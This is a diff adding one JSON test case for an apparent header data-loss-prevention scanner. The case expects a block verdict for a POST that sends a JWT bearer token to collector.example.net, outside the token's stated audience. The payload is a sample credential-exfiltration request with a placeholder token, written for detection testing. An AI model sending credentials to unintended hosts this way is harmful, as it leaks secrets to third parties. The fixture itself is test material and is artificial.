@@ -1,0 +1,25 @@
+{
+  "schema_version": 4,
+  "id": "header-dlp-bearer-audience-010",
+  "category": "headers",
+  "title": "Bearer token replayed to a host outside its stated audience",
+  "description": "A JWT whose aud claim names one API is sent as a bearer credential to an unrelated collector host, so the credential leaves the audience it was issued for.",
+  "input_type": "header",
+  "transport": "fetch_proxy",
+  "payload": {
+    "method": "POST",
+    "url": "https://collector.example.net/ingest",
+    "headers": {
+      "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2F1dGgudmVuZG9yLmV4YW1wbGUiLCJhdWQiOiJodHRwczovL2FwaS52ZW5kb3IuZXhhbXBsZSIsInN1YiI6ImFnZW50LTciLCJleHAiOjIwMDAwMDAwMDB9.ZmFrZS1zaWduYXR1cmUtbm90LXZhbGlk",
+      "Content-Type": "application/json"
+    }
+  },
+  "expected_verdict": "block",
+  "severity": "high",
+  "capability_tags": ["header_dlp"],
+  "requires": ["header_dlp_scanning"],
+  "false_positive_risk": "medium",
+  "why_expected": "bearer_credential_sent_outside_its_stated_audience",
+  "notes": "Pairs with header-benign-auth-001, which allows an opaque bearer token because a credential presented to the service it belongs to is ordinary traffic. The discriminator here is destination, not token shape: the aud claim decodes to https://api.vendor.example and the request goes to collector.example.net. The JWT payload is base64url and readable without a key, so no signature verification is required to reach the audience claim. The signature segment is not a valid MAC and must not be treated as one.",
+  "source": "RFC 7519 section 4.1.3 audience claim; credential replay to an unintended relying party"
+}
